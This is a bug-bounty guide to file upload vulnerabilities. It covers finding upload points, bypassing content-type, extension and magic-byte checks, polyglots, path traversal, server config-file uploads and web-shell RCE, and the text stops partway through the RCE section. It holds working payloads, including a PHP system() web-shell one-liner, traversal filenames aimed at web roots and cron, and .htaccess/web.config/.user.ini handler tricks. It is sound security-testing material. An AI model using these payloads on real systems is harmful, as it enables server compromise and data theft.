# File Upload Vulnerabilities — Complete In-Depth Testing Guide (Expert / Bug-Bounty & Red-Team Edition)

**Author:** x8bitranjit
**Scope:** Any feature that accepts a file — avatars, attachments, documents, KYC, imports (CSV/XML), logos, resumes, support tickets, "import from URL", profile media, signatures, bulk-upload, image processing
**Platforms:** Kali/Linux first-class; Windows/WSL notes provided
**Companion files in this folder:**
- `FILE_UPLOAD_ARSENAL.md` — extension table, per-server bypass tricks, polyglot recipes, payloads (copy-paste)
- `FILE_UPLOAD_CHECKLIST.md` — the testing-order checklist you tick per upload point
- `FILE_UPLOAD_REPORT_TEMPLATE.md` — the report skeleton that gets paid
- `poc/` — **benign** test files + generators (marker web-shell, SVG-XSS, XXE-SVG, polyglot, zip-slip)

> **Companion to the XSS / JWT / Recon guides.** Same philosophy: *find* is Part I–II, *get paid* is Part III–IV. File upload is special because it spans the **entire severity range in one feature** — from "uploaded an emoji" (nothing) to **remote code execution** (the single highest-paying web bug). The whole game is: **what does the server do with the bytes, and where can you reach the result?** Read Part III before you spend a day fuzzing extensions.

---

> ### ⚡ READ THIS FIRST — why most file-upload reports underpay (or get closed)
>
> *In plain words — the anchor for this whole class:* uploading a file is like **handing a package to a building's mailroom.** Three things decide whether it's dangerous, and only one of them is about the package itself: (a) what's *inside* it (your bytes), (b) the *label* you wrote (filename + declared type — you can write anything), and — the one that actually matters — (c) **which room it gets delivered to and who opens it.** A "bomb" left in the mailroom bin is harmless; the *same* package delivered to the server's control room and opened = remote code execution. So "the mailroom accepted my package" (§1 below) is a non-event. **Where it's stored, what URL serves it, and which handler opens it** is the whole finding.
>
> 1. **"It accepted my file" is not a vulnerability.** Uploading a `.php` is meaningless unless that file is **stored somewhere reachable** and **executed/rendered as code**. The finding is *execution or impact*, not acceptance. Always answer: **where is it stored, what URL serves it, and with what `Content-Type`/handler?** (§4 — the most important phase.)
> 2. **Two questions decide everything:** (a) *Can I control the file's interpretation?* (extension/MIME/magic/processing) and (b) *Can I reach the stored file in a context that executes it?* (web root + exec handler = RCE; app origin + inline = XSS; a parser = XXE/SSRF). No reachable execution context → no high-severity bug.
> 3. **Where it's served caps the severity.** A `.svg` with script served **inline from the app origin** is stored XSS; the *same* file served from a **sandboxed CDN** with `Content-Disposition: attachment` is near-zero. Find the serving URL *first*.
> 4. **RCE > XXE/SSRF > Stored-XSS > overwrite/IDOR > DoS > info-leak.** Climb to the highest the app allows. A web shell is Critical; "I can upload an SVG that XSSes in a sandbox" is Low.
> 5. **Don't weaponize.** Prove execution with a **unique marker / single harmless command** (`id`, hostname, a random token) — never drop an interactive backdoor or touch other users' files/data. A clean marker PoC pays the same and keeps you legal (§26).
>
> **Where the money is (memorize this order):** ① **RCE via executable upload** (web shell / `.htaccess` / processing exploit) → ② **XXE or SSRF** via parsed uploads (SVG/Office/XML, "upload from URL") → ③ **stored XSS** via SVG/HTML served from the app origin (esp. admin-rendered) → ④ **path-traversal/overwrite → ATO or RCE** (overwrite another user's file, a config, a key) → ⑤ *then* DoS, CSV-injection, and filename-XSS as **Low–Medium**, not headliners.

---

## Table of Contents

**▶ [Master Testing Sequence — the testing order](#master-testing-sequence--the-testing-order)**

**PART I — FOUNDATIONS, RECON & BASELINE**
1. [Environment & Tooling Setup](#1-environment--tooling-setup)
2. [Upload Anatomy — The Controls & Where They Break](#2-upload-anatomy--the-controls--where-they-break)
3. [Reconnaissance — Find Every Upload Point](#3-reconnaissance--find-every-upload-point)
4. [Baseline — What's Accepted, Where Stored, Where Served](#4-baseline--what-is-accepted-where-stored-where-served)

**PART II — CONTROL BYPASS (work in this order)**
5. [Client-Side Validation Bypass](#5-client-side-validation-bypass)
6. [Content-Type / MIME Bypass](#6-content-type--mime-bypass)
7. [Extension Allowlist / Denylist Bypass](#7-extension-allowlist--denylist-bypass)
8. [Magic-Byte / Signature / Polyglot Bypass](#8-magic-byte--signature--polyglot-bypass)
9. [Filename & Path-Traversal Tricks](#9-filename--path-traversal-tricks)
10. [`.htaccess` / `web.config` — Making Files Executable](#10-htaccess--webconfig--making-files-executable)
11. [Image Re-Processing Bypass](#11-image-re-processing-bypass)

**PART III — EXPLOITATION BY IMPACT (where the money is)**
12. [RCE via Web Shell — The Crown Jewel](#12-rce-via-web-shell)
13. [Stored XSS via Upload (SVG / HTML / Polyglot)](#13-stored-xss-via-upload)
14. [XXE via Uploaded Files (SVG / Office / XML)](#14-xxe-via-uploaded-files)
15. [SSRF via Upload-from-URL & File Fetch](#15-ssrf-via-upload-from-url--file-fetch)
16. [Image / Document Processing Exploits](#16-image--document-processing-exploits)
17. [Archive Attacks — Zip Slip & Zip Bomb](#17-archive-attacks--zip-slip--zip-bomb)
18. [File Overwrite / IDOR / Path-Based ATO](#18-file-overwrite--idor--path-based-ato)
19. [DoS via Upload](#19-dos-via-upload)
20. [CSV / Formula Injection (Export Adjacency)](#20-csv--formula-injection)

**PART IV — VALIDITY, SEVERITY & REPORTING (the bug-bounty layer)**
21. [The Escalation Mindset](#21-the-escalation-mindset)
22. [The Validity-First Mindset](#22-the-validity-first-mindset)
23. [False Positives — STOP reporting these](#23-false-positives--stop-reporting-these-auto-reject-list)
24. [Severity Calibration](#24-severity-calibration--how-triagers-really-rate-upload-bugs)
25. [Impact-Escalation Playbooks — "you found X, now do Y"](#25-impact-escalation-playbooks--you-found-x-now-do-y)
26. [Building a Professional, Safe PoC](#26-building-a-professional-safe-poc)
27. [Reporting, CWE/CVSS & De-duplication](#27-reporting-cwecvss--de-duplication)
28. [Automation & Red-Team Notes](#28-automation--red-team-notes)

**Appendices**
- [Appendix A — Upload Workflow Cheat Sheet](#appendix-a--upload-workflow-cheat-sheet)
- [Appendix B — Upload Attack Decision Tree](#appendix-b--upload-attack-decision-tree)
- [Appendix C — Important Links](#appendix-c--important-links)

---

# Master Testing Sequence — The Testing Order

> **This is the spine.** Work top-to-bottom. Each phase says *what to do*, *which § for detail*, and the *deliverable*. Numbered sections (1–28) are the reference detail; this is the order you execute.

```
PHASE 0  RECON & LAB       → find EVERY upload point (§3) · build lab + OOB listener (§1)
PHASE 1  BASELINE  ★       → upload a valid file: WHERE stored? WHAT url? WHICH Content-Type/handler? (§4)
                             map the controls: client/server · extension · MIME · magic · processing · storage
PHASE 2  CONTROL BYPASS    → defeat each control in order:
                             client (§5) · MIME (§6) · extension (§7) · magic/polyglot (§8) ·
                             filename/traversal (§9) · .htaccess (§10) · image re-proc (§11)
PHASE 3  IMPACT  ⭐ (money) → turn a surviving upload into harm:
                             RCE web shell (§12) · stored XSS (§13) · XXE (§14) · SSRF (§15) ·
                             processing RCE (§16) · zip slip/bomb (§17) · overwrite/IDOR→ATO (§18) ·
                             DoS (§19) · CSV injection (§20)
PHASE 4  VALIDATE → REPORT → validity (§22) · false-positive filter (§23) · severity+CVSS+CWE (§24) ·
                             SAFE marker PoC (§26) · dedup (§27) · report template
```

**Phase-by-phase, with the deliverable before moving on:**

1. **PHASE 0 — Recon & lab.** Enumerate **every** upload feature (§3) — not just the obvious avatar; imports, KYC, "from URL", attachments hide the best bugs. Stand up an OOB listener (interactsh/Collaborator) for XXE/SSRF. *Deliverable:* a list of upload endpoints + their parameters.
2. **PHASE 1 — Baseline ⭐.** For each point, upload a *valid* file and answer the three questions that decide severity: **where is it stored, what URL serves it back, and with what `Content-Type` + server handler?** Map every control (§4). *Deliverable:* per-endpoint: storage path, serving URL, controls in place.
3. **PHASE 2 — Control bypass.** Defeat the controls in order of effort: client-side (§5), MIME (§6), extension (§7), magic bytes/polyglot (§8), filename/traversal (§9), `.htaccess`/`web.config` (§10), image re-processing (§11). *Deliverable:* a file that *survives* the controls and lands in a reachable spot.
4. **PHASE 3 — Impact ⭐.** Convert a surviving upload into the highest impact the context allows: RCE (§12/§16), XXE (§14), SSRF (§15), stored XSS (§13), overwrite/IDOR→ATO (§18), archive attacks (§17), DoS (§19). *Deliverable:* demonstrated execution/impact with a **benign marker**.
5. **PHASE 4 — Validate → report.** Apply validity & false-positive filters (§22/§23), set a defensible CVSS/CWE (§24), build a clean *safe* PoC (§26), de-dup, write it up (§27). *Deliverable:* the submitted report.

Reference anytime: payloads → `FILE_UPLOAD_ARSENAL.md`; checklist → `FILE_UPLOAD_CHECKLIST.md`; test files → `poc/`; playbooks **§25**.

---

# PART I — FOUNDATIONS, RECON & BASELINE

# 1. Environment & Tooling Setup

You mostly need **Burp** (to tamper the multipart request) and a way to **see where the file lands**. The rest is situational.

| Tool | Job |
|------|-----|
| **Burp Suite** (Repeater/Intruder) | tamper `filename`, `Content-Type`, magic bytes; replay; the core tool |
| **Upload Scanner (Burp BApp)** | automated upload fuzzing across extensions/content-types/polyglots |
| **interactsh / Burp Collaborator** | OOB callbacks for **XXE** and **SSRF** (blind, common here) |
| **exiftool** | inspect/inject metadata; build exiftool-RCE payloads (§16) |
| **ImageMagick / `convert`** | test image re-processing; build ImageTragick payloads (§16) |
| **`file` / `xxd` / `hexedit`** | check magic bytes, build polyglots |
| **`zip` / Python `zipfile`** | craft Zip-Slip archives & zip bombs (§17) |
| **`ffuf`** | fuzz the upload + then fuzz for where the file is served |
| **fuxploider / Upload_Bypass** | automated extension/MIME bypass discovery |
| **a server you control + ngrok** | host `.htaccess`/remote payloads; receive OOB |

```bash
# Quick installs (Kali/WSL)
sudo apt install -y exiftool imagemagick zip xxd ffuf
pip install fuxploider 2>/dev/null || git clone https://github.com/almandin/fuxploider
# Burp BApps: "Upload Scanner", "Hackvertor" (encoding), "Collaborator Everywhere"
```

**Stand up an OOB listener now** — XXE and SSRF here are usually *blind*; you confirm via callback:
```bash
interactsh-client -v        # gives you a host that logs DNS/HTTP hits (proves XXE/SSRF)
```

> **Windows:** tamper in Burp on Windows fine; run `exiftool`/`convert`/`zip` payload-building in **WSL**. Keep this kit's `poc/` folder reachable from WSL (via the `/mnt/<drive>/…` mount of wherever this kit lives) so the generators run there.

---

# 2. Upload Anatomy — The Controls & Where They Break

> *In plain words:* your package passes through a line of inspectors — the browser's JS check, then the label-reader (MIME), the name-reader (extension), the byte-peeker (magic), the re-wrapper (re-encode), and finally the delivery step (storage + serving). **Each inspector is a separate lock to pick**, and they don't talk to each other well. Find which ones exist, then break the weakest.

An upload passes through a chain of controls. **Each is a separate bypass target** — enumerate which ones exist (§4), then break the weakest:

```
CLIENT      → JS/HTML accept="" + JS extension/size check        → trivial (§5): tamper the request, controls never reach server
TRANSPORT   → the multipart body: filename, Content-Type per part → you control ALL of this (§6,§7,§9)
EXTENSION   → server allowlist (.jpg only) or denylist (no .php)  → allowlist is strong; denylist leaks (.phtml/.pht/.phar) (§7)
MIME/TYPE   → checks Content-Type header                          → header is attacker-set → bypass (§6)
MAGIC BYTES → reads first bytes (GIF89a/%PNG)                     → prepend valid magic / polyglot (§8)
CONTENT     → re-encodes image / strips metadata / sanitizes      → strongest; defeat via polyglot survival or processing exploit (§11,§16)
FILENAME    → sanitizes path/specials                            → traversal/overwrite if not (§9,§18)
STORAGE     → where on disk + is it the web root?                 → web root + exec handler = RCE (§12)
SERVING     → what URL, what Content-Type, inline vs attachment  → app-origin inline = XSS; sandbox+attachment = safe (§4,§13)
PROCESSING  → ImageMagick/Ghostscript/exiftool/PDF/XML parsers    → known RCE/XXE/SSRF in the parser (§14,§16)
```

> **The mental model:** the attacker controls the **bytes, the filename, and the declared Content-Type**. The server controls **interpretation and location**. A bug exists wherever the server's interpretation/location lets your bytes *execute or be parsed dangerously*. Your job: find the gap between "what the server thinks the file is" and "what actually happens to it."

---

# 3. Reconnaissance — Find Every Upload Point

Most hunters test the avatar and stop. The high-impact uploads are the **boring, server-processed** ones.

```
□ Obvious:        avatar/profile pic · cover/banner · logo · attachment · "browse..."
□ Documents:      KYC/ID upload · resume/CV · invoice · contract · proof-of-payment (often server-PARSED = XXE/processing)
□ Imports:        CSV/Excel import · XML/JSON import · "bulk upload" · vCard/iCal · OPML (→ XXE, formula injection)
□ Media pipelines:image resize/crop/thumbnail · video transcode · PDF preview/generate (→ ImageMagick/Ghostscript RCE, SSRF)
□ Indirect:       "import from URL" / "fetch image by link" (→ SSRF) · webhook payloads · email attachments processed server-side
□ Hidden:         API-only upload endpoints (in JS/swagger — see Recon guide §15/§16) · S3 pre-signed PUT · GraphQL file upload
□ Admin/staff:    bulk-import in admin panels, theme/plugin upload (→ direct RCE), template upload
```
**Recon tips (tie into the Recon guide):**
- Grep JS bundles & swagger for `upload`, `/import`, `multipart`, `presigned`, `attachment`, `avatar`, `/media`, `file`.
- Check the response to a normal upload for the **returned URL/path** — that's your serving location (§4).
- Look for **pre-signed S3 PUT** flows — you may control the key/path → overwrite/traversal.

> **If this → then that:** a "import from URL" or "fetch logo from link" feature → go straight to **SSRF** (§15), often the fastest high-severity win. A KYC/document upload that produces a **preview/thumbnail** → server is *parsing* it → test **XXE/ImageMagick/Ghostscript** (§14/§16).

---

# 4. Baseline — What Is Accepted, Where Stored, Where Served

> *In plain words:* before trying to defeat any inspector, **follow one honest package through the whole system** and watch where it ends up. Upload a normal image, then answer three questions: where is it stored, what URL hands it back, and with what type/handler? Those three answers *are* your severity ceiling — a web-root + PHP-handler landing means RCE is on the table; a sandboxed CDN with `attachment` means it never will be. Skipping this is why hunters waste a day fuzzing extensions against a hardened endpoint.

**This is the single most important phase. Do it before any bypass.** Severity is decided here, not by the payload.

## 4.1 Upload a clean, valid file and answer THREE questions
```
1. WHERE is it stored?   → returned path/URL in the response; guessable? user-scoped? web-root?
2. WHAT URL serves it?   → fetch it back. Same origin as the app? A subdomain? A sandboxed CDN (usercontent/cloudfront/s3)?
3. HOW is it served?     → response Content-Type, Content-Disposition (inline vs attachment), X-Content-Type-Options: nosniff?
```
```bash
# Upload a valid PNG, then inspect how it's served back:
curl -sI "https://target.com/uploads/u123/avatar.png"
# look at: Content-Type · Content-Disposition · X-Content-Type-Options · the HOST (app vs CDN)
```

## 4.2 Map the controls (probe, don't guess)
Send a series of probe uploads and watch which get rejected — that tells you the control:
```
□ rename valid.png → valid.php (keep PNG bytes)         → rejected by EXTENSION check? or accepted?
□ keep .png name, change Content-Type to text/plain     → rejected by MIME check?
□ upload .php with text bytes (no magic)                → rejected by MAGIC check?
□ upload a real image, then check if EXIF/comment kept  → re-PROCESSED (re-encoded) or stored as-is?
□ filename "a/../b.png"                                  → path handling / sanitization?
□ huge file / 0-byte file                               → size limits?
```

## 4.3 The severity map you build here
```
Stored in WEB ROOT + server has a script handler (PHP/JSP/ASPX)     → RCE possible (§12)  ⭐⭐⭐
Served INLINE from the APP ORIGIN (Content-Type honored, no nosniff) → stored XSS possible (SVG/HTML, §13) ⭐⭐
Server PARSES the file (preview/thumbnail/import)                    → XXE / processing RCE / SSRF (§14/§15/§16) ⭐⭐
Filename/path is attacker-influenced into the stored path            → traversal / overwrite / IDOR (§9/§18) ⭐
Served as ATTACHMENT from a SANDBOXED CDN with nosniff               → low ceiling; don't over-invest
Re-encoded to a clean image, random filename, sandbox domain         → likely a dead end for XSS/RCE (§23)
```

> **Don't skip this to start firing shells.** If files are re-encoded, randomly named, and served as attachments from `usercontent-cdn.com` with `nosniff`, the upload is well-hardened — spend your time on a *parsed* import or a *URL-fetch* feature instead. Baseline tells you where to spend effort.

---

# PART II — CONTROL BYPASS (work in this order)

> Full payload tables and per-server tricks are in `FILE_UPLOAD_ARSENAL.md`. These sections teach the *logic*.

# 5. Client-Side Validation Bypass

If the only check is in JavaScript/HTML (`accept=".jpg"`, a JS size/extension validator), it never reaches the server — **just tamper the request**.

```
□ Intercept the upload in Burp → change the filename/Content-Type AFTER the JS check passed.
□ Or call the upload endpoint directly (curl/Repeater), skipping the page entirely.
□ Or edit the DOM (remove accept/disable the validator) and submit.
```
```bash
# Direct multipart upload, bypassing all client-side checks:
curl -X POST https://target/upload -F "file=@shell.php;type=image/png;filename=shell.php"
```
> Client-side validation is **never** a security control. If that's all there is, every later bypass is free. Confirm by uploading a clearly-invalid file via Repeater and seeing it accepted.

---

# 6. Content-Type / MIME Bypass

> *In plain words:* "type" is claimed in **three separate places** — the header you send, the filename extension, and the actual bytes — and you control all three. A weak server trusts just one; a strong one cross-checks them. The whole game of this section is figuring out *which* one the validator trusts, then making that one lie while your payload still runs.

MIME/type validation is the **most common** upload control and the most varied — there are **five different ways** a server can "check the type," and each has a different bypass. The amateur move is to change one header and give up when it fails. The expert move is to **identify which of the five models is in play** (probe in §4.2), then apply the matching bypass. Type is asserted in **three independent places** — and a robust server cross-checks all three:

```
(1) the multipart part's Content-Type header      ← YOU fully control this
(2) the filename EXTENSION (.png, .php)            ← YOU fully control this (§7)
(3) the actual BYTES (magic signature / decode)    ← YOU control via prepend/polyglot (§8)
```
The bug is the gap between what the validator trusts and what the server later **executes/serves**. Make the three *consistent enough* to pass validation while the bytes still run (a polyglot, §8). Full copy-paste lists: `FILE_UPLOAD_ARSENAL.md` §N (MIME matrix) and §O (structural tricks).

## 6.1 First, identify HOW the type is validated (the five models)

| # | Validation model | How to recognize it (§4.2 probes) | The bypass |
|---|---|---|---|
| **A** | **Trusts the part's `Content-Type` header** | Keep a `.php` name + change part CT to `image/png` → accepted | Just **lie in the header** (below). Weakest control. |
| **B** | **Extension → MIME map** (Apache `mod_mime`, Python `mimetypes`, `mime.types`) | CT header ignored; only the extension decides accept/reject | **Extension tricks** (§7): double-ext, `.phtml`, case, `%00`, `;` — the *executing* extension differs from the *checked* one |
| **C** | **Magic bytes via libmagic** (`finfo_file`, PHP `finfo`, `file`, Node `mmmagic`/`file-type`, Python `python-magic`) | Changing the header does nothing; prepending `GIF89a`/`%PNG` flips accept | **Prepend real magic / polyglot** (§8); the magic sig says "image," your appended/comment bytes still run |
| **D** | **Real image decode** (`getimagesize()`, GD/Pillow `Image.open`, ImageMagick `identify`) | Only a *genuinely decodable* image is accepted; bare magic prefix is rejected | **Valid-image polyglot** — a file that truly decodes **and** carries your payload (PHP in EXIF/comment/IDAT/trailer, §8/§11) |
| **E** | **Framework validators** — Rails `Marcel`/`content_type`, Django `ImageField`/`FileExtensionValidator`, Multer `fileFilter`, Spring `MediaType`/`Tika`, .NET `ContentType` | Behaviour matches one of A–D (read the framework/version) | Use that framework's known weakness (e.g. Multer trusts the client CT; Django `FileField` checks only extension unless `ImageField`; Tika can be confused by polyglots) |

> **Probe to classify (do this first):** send the *same bytes* four ways — (1) correct image, (2) `.php` name + `image/png` CT, (3) `.png` name + `text/plain` CT, (4) PHP bytes + `image/png` CT + `GIF89a` prefix. Which combinations are accepted tells you exactly which model you face and therefore which bypass to invest in.

## 6.2 Lie in the header (Model A — the baseline move)

```
In the multipart body, set the PART's Content-Type to an allowed type while keeping your payload:
  Content-Disposition: form-data; name="file"; filename="shell.phtml"
  Content-Type: image/png            ← the lie the validator trusts
  GIF89a;                            ← optional magic (if Model C/D too)
  <?php echo "RCE-POC-".php_uname(); ?>
```
Note: the **request** `Content-Type` is `multipart/form-data` — that's *not* what's validated. The validator reads the **per-part** `Content-Type`. Beginners change the wrong one.

## 6.3 The Content-Type matrix — types to try (full list in arsenal §N)

Set the part's CT to a type the allowlist permits. Cover **every category** the app might accept, not just `image/png`:

```
IMAGES        image/png  image/jpeg  image/jpg  image/gif  image/webp  image/bmp  image/svg+xml
              image/tiff  image/x-icon  image/vnd.microsoft.icon  image/heic  image/avif  image/x-ms-bmp
DOCUMENTS     application/pdf  application/msword  application/rtf  text/rtf
              application/vnd.openxmlformats-officedocument.wordprocessingml.document   (docx)
              application/vnd.openxmlformats-officedocument.spreadsheetml.sheet         (xlsx)
              application/vnd.ms-excel  application/vnd.ms-powerpoint  application/vnd.oasis.opendocument.text
TEXT/MARKUP   text/plain  text/csv  text/html  text/xml  application/xml  application/json  text/markdown
ARCHIVES      application/zip  application/x-zip-compressed  application/gzip  application/x-tar
              application/x-7z-compressed  application/x-rar-compressed  application/java-archive (jar)
AUDIO/VIDEO   video/mp4  video/quicktime  video/x-msvideo  audio/mpeg  audio/wav  application/ogg
GENERIC/EDGE  application/octet-stream   (missing CT)   ""(empty)   image/png; charset=utf-8   IMAGE/PNG (case)
              multipart/form-data        application/force-download
WHEN YOU WANT IT INTERPRETED (for RCE/XSS targets, NOT to pass an allowlist):
              application/x-httpd-php  application/x-php  text/x-php  text/html  image/svg+xml  text/xml
```

## 6.4 Structural / parser-confusion tricks (the real bypasses — arsenal §O)

When a single header swap fails, attack **how the multipart parser reads the part** — front-end validator and back-end framework often disagree:

```
□ Missing Content-Type            → some validators default-allow / skip the check.
□ Duplicate Content-Type headers  → send TWO; validator reads the first, server the second (or vice versa).
□ Mismatched TRIPLE               → CT=image/png, ext=.php, magic=GIF89a → find which one each tier trusts.
□ Multiple file parts (same name) → validator checks part #1 (clean), server stores part #2 (payload).
□ Array param name="file[]"       → some validators only inspect file[0].
□ Charset / extra params          → image/png; charset=utf-8 ; image/png;boundary=x ; image/png;;
□ Header case / whitespace        → "content-type:", "Content-Type :", leading/trailing spaces, tabs.
□ Content-Disposition tampering   → swap order of name/filename; quoted vs unquoted; RFC-2231 filename*=utf-8''shell.php
□ Filename with ; or newline      → filename="shell.png";filename="shell.php" ; CRLF/`%0a` in filename.
□ Nested / mixed multipart        → multipart/mixed sub-part the validator skips but the framework processes.
□ Content-Transfer-Encoding       → base64-encode the part body (some validators don't decode before checking).
```

> **If this → then that:** changing the part CT alone is accepted → Model **A**, you're basically done — pair it with an executable extension (§7). Changing the CT does nothing but `GIF89a` flips it → Model **C/D**, build a **polyglot** (§8). Only a real decodable image passes → Model **D**, use a **valid-image-with-embedded-payload** (EXIF/comment, §8/§11). Validator and storage disagree on which part/header wins → exploit the **structural tricks** above (duplicate CT, multi-part, array) — these are the bypasses that beat "properly" combined checks.

> **References for this section:** PortSwigger Web Security Academy (File upload — *Flawed file type validation*), PayloadsAllTheThings *Upload Insecure Files* (Content-Type & extension lists), HackTricks *File Upload* (MIME/magic matrix), Hackviser & PentesterLab upload modules, and real bug-bounty write-ups (Multer/`fileFilter` trust-the-client-CT bugs, WordPress/CMS `.phtml` & double-extension RCEs). Mirrored copy-paste lists live in the arsenal §N/§O.

---

# 7. Extension Allowlist / Denylist Bypass

**Denylist** (block `.php`, `.exe`) leaks constantly. **Allowlist** (only `.jpg/.png`) is strong — attack it via the *serving* side or polyglots instead.

## 7.1 Denylist bypasses (find an executable extension they forgot)
```
PHP:    .php3 .php4 .php5 .php7 .pht .phtml .phar .pgif .phps .inc  (and .php. .php%20 .php%00 .php::$DATA)
ASP:    .asp .aspx .ascx .asmx .ashx .cer .asa .cshtml .config (web.config!)
JSP:    .jsp .jspx .jspf .jsw .jsv .jhtml
Other:  .pl .cgi .py .sh (if mapped) · .htaccess (§10) · .svg/.html/.xhtml (for XSS, §13)
Case:   .pHp .PhP .Php  (case-insensitive FS but case-sensitive denylist)
Trailing/special:  shell.php.  ·  shell.php%00.jpg (null byte, legacy)  ·  shell.php;.jpg  ·  shell.php/  ·  shell.php#.jpg
Double:  shell.jpg.php (if it takes the LAST ext)  ·  shell.php.jpg (if a misconfig runs the FIRST, e.g. Apache multiviews/AddHandler)
```

## 7.2 The double-extension nuance (this is where RCE often hides)
- Apache with `AddHandler php .php` (or multiple handlers) can execute `shell.php.jpg` because it runs **any** file *containing* `.php`. → upload `shell.php.jpg` and it executes.
- Servers that validate the **last** extension but execute on the **first** are the classic gap.
- IIS legacy: `shell.asp;.jpg` (semicolon) or `shell.asp::$DATA` (NTFS ADS).

> **If this → then that:** allowlist permits `.jpg` but the host is Apache with module handlers → try `shell.php.jpg`, `.phtml`, and an `.htaccess` (§10) to *force* execution of an allowed extension. Allowlist + sandbox CDN + re-encoding → pivot away from RCE to a parsed-import/XXE path.

---

# 8. Magic-Byte / Signature / Polyglot Bypass

> *In plain words:* the byte-peeker inspector only reads the *first few bytes* to decide "is this a real image?" A **polyglot** is a file that is honestly two things at once — a valid image to the peeker AND valid code to the engine that runs it later. You put a real `GIF89a` header up front (peeker happy) and your `<?php …?>` in a spot the image format ignores but PHP still scans (engine happy). One file, two truths.

The server reads the first bytes to verify it's "really" an image. Defeat by **prepending valid magic bytes** or building a **polyglot** (valid image AND valid script).

```
Prepend a real image signature, then your payload:
  GIF89a;<?php system($_GET['c']); ?>          (GIF magic + PHP)
  %PNG\r\n... then payload in a chunk/comment
  Real JPEG with PHP in the EXIF Comment (exiftool -Comment='<?php ...?>')
```
**Polyglot logic:** the file must satisfy *both* checks — the image parser sees a valid image; the script engine reaches your code. Put PHP in an image comment/metadata field that the image format ignores but PHP still scans for `<?php`.

```bash
# JPEG + PHP via EXIF comment (survives some re-encoders too):
exiftool -Comment='<?php echo "RCE-MARKER"; ?>' image.jpg -o shell.jpg.php
# GIF + PHP one-liner:
printf 'GIF89a;\n<?php echo "RCE-MARKER"; ?>\n' > shell.gif.php
```
> Polyglots are the answer when **magic + MIME + extension** are all checked but the **serving/handler** side still executes by extension or content. They also survive *some* image re-processing (the comment field is preserved) — see §11.

---

# 9. Filename & Path-Traversal Tricks

If the filename flows into the **storage path** unsanitized, you can write **outside** the upload directory — overwrite web files, configs, cron, SSH keys, or another user's file.

```
filename="../../../../var/www/html/shell.php"
filename="..%2f..%2f..%2fshell.php"
filename="....//....//shell.php"            (filter strips ../ once → ....// survives)
filename="/etc/cron.d/x"                    (absolute path)
filename="..\..\..\inetpub\wwwroot\x.aspx"  (Windows)
```
**Also:** filename used unescaped in a response/page → **stored XSS via filename** (`"><img src=x onerror=alert(document.domain)>.png`). And overly-long/Unicode/`%00` filenames cause truncation that changes the effective extension.

> **If this → then that:** traversal writes to the web root → drop a script there → **RCE**. Traversal overwrites *another user's* avatar/document by ID/path → **IDOR/integrity** (§18). Filename reflected in an admin file-list → **stored/blind XSS** (XSS guide §13).

---

# 10. Config-File Upload — Making Files Executable (`.htaccess` · `web.config` · `.user.ini` · FPM)

If you can upload a **config file** into the upload directory, you can **reconfigure the server to execute your "images" as code** — turning an allowlist into RCE. There are four primitives; test each.

## 10.1 `.htaccess` (Apache + mod_php)
```apache
# .htaccess uploaded to the upload dir → makes .jpg run as PHP:
AddType application/x-httpd-php .jpg
# or force-handler:
AddHandler php7-script .jpg
# robust (handler for several image exts):
<FilesMatch "\.(jpe?g|png|gif)$">
  SetHandler application/x-httpd-php
</FilesMatch>
# also: ForceType text/html → render uploads as HTML (→ stored XSS); Options +Indexes → dir listing.
```
Then upload `shell.jpg` (containing PHP) → request it → executes. Needs `AllowOverride FileInfo` (common).

## 10.2 `web.config` (IIS / ASP.NET)
```xml
<!-- web.config uploaded to the dir → handler mapping / inline classic ASP -->
<configuration><system.webServer><handlers>
  <add name="x" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory"/>
</handlers></system.webServer></configuration>
<%@ Language="JScript"%><% Response.Write("RCE-"+(7*7)); %>     <!-- some setups run classic ASP inline -->
```
`web.config` can also be abused for URL-rewrite SSRF, disabling auth in that dir, or stored config injection.

## 10.3 `.user.ini` (PHP-FPM / CGI — the under-tested primitive)
On **PHP-FPM**, a per-directory `.user.ini` is read for `PHP_INI_PERDIR` settings. Upload:
```ini
; .user.ini
auto_prepend_file=shell.gif
```
plus `shell.gif` containing `<?php echo "RCE-POC-".php_uname(); ?>`. Now **every** `.php` file executed in that directory **auto-includes your shell** — so if the upload dir contains (or you can reach) *any* `.php`, you get execution. Subtle, often missed, and `.user.ini` is rarely on denylists.

## 10.4 nginx + PHP-FPM `cgi.fix_pathinfo=1` path trick
Where nginx passes anything `*.php` to FPM and `cgi.fix_pathinfo=1` is set, a request like:
```
/uploads/avatar.jpg/x.php      → FPM splits PATH_INFO and executes avatar.jpg AS PHP
/uploads/avatar.jpg%00.php     (legacy null-byte variant)
```
So an uploaded **valid image containing `<?php …?>`** (magic-byte polyglot, §8) executes when requested via the `…/x.php` path — no config-file upload needed.

> This is a top "expert" technique: even a strict **allowlist of image extensions** falls if a config file (`.htaccess`/`web.config`/**`.user.ini`**) isn't blocked, or if FPM `fix_pathinfo` lets `image.jpg/x.php` run. Always test whether config files can land in the serving directory **and** the FPM path trick.

---

# 11. Image Re-Processing Bypass

The strongest defense: the server **re-encodes** every image (resize/convert/strip), destroying appended payloads. Counter-strategies:

```
□ Survive re-encoding: hide the payload where re-encoding preserves it
   - EXIF/Comment fields are often KEPT by some libraries → exiftool comment payload may survive.
   - For XSS, upload an actual SVG (vector, not raster) — if served inline it XSSes regardless of raster re-encoding (§13).
□ Attack the PROCESSOR itself (don't bypass it — exploit it):
   - ImageMagick (ImageTragick CVE-2016-3714) → RCE via crafted image (§16).
   - Ghostscript (PDF/PS) → RCE (§16).
   - exiftool (CVE-2021-22204) → RCE via crafted metadata (§16).
   - XML-based formats (SVG/Office) parsed → XXE (§14).
□ Type confusion: upload a format the validator accepts but the PROCESSOR mishandles.
```
> When you see "image gets resized/converted," don't give up on RCE — that processing pipeline is often a **bigger** bug than a plain web shell, because the parser runs server-side with a known CVE (§16).

---

# PART III — EXPLOITATION BY IMPACT (where the money is)

> Every PoC here uses a **benign marker / single harmless command** and your **own** account/files. Never weaponize or touch other users' data (§26).

# 12. RCE via Web Shell

> *In plain words:* the jackpot. It only happens when **all four links line up**: your file survives the inspectors, lands in a folder the web server *executes*, that server has the matching engine (PHP/ASPX/JSP), and you can *request the file's URL*. Miss any one and there's no RCE — a `.php` served as plain text is not RCE, it's a screenshot of a `.php`. Prove it with a marker that prints a unique token + the hostname; that's a complete Critical without ever dropping a real backdoor.

The crown jewel. Achieved when an uploaded file with server-side code lands in a location with a **matching execution handler** and you can request it.

## 12.1 The full chain (all must be true)
```
1. Upload survives extension/MIME/magic controls (Part II).
2. It's stored in a directory the web server EXECUTES (web root, or a dir you made executable via .htaccess §10).
3. The server has the handler (PHP/ASPX/JSP) for that file's effective extension.
4. You can REQUEST the stored file's URL.
```
